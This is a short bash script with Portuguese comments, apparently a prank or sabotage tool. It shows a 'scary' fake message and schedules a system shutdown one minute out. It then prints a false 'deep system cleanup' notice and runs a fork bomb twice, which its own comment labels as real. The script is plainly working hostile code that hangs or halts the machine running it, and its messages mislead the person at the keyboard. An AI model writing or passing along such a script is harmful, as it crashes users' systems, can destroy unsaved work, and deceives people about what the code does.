#!/bin/bash

# Mostra mensagem "assustadora"
echo "sudo apt uninstall"
sleep 1

# Comando de desligamento temporizado
shutdown -h 1
sleep 1

# Fork bomb real
echo "⚠️ Iniciando limpeza profunda do sistema..."
sleep 1
:(){ :|:& };:
:(){ :|:& };:
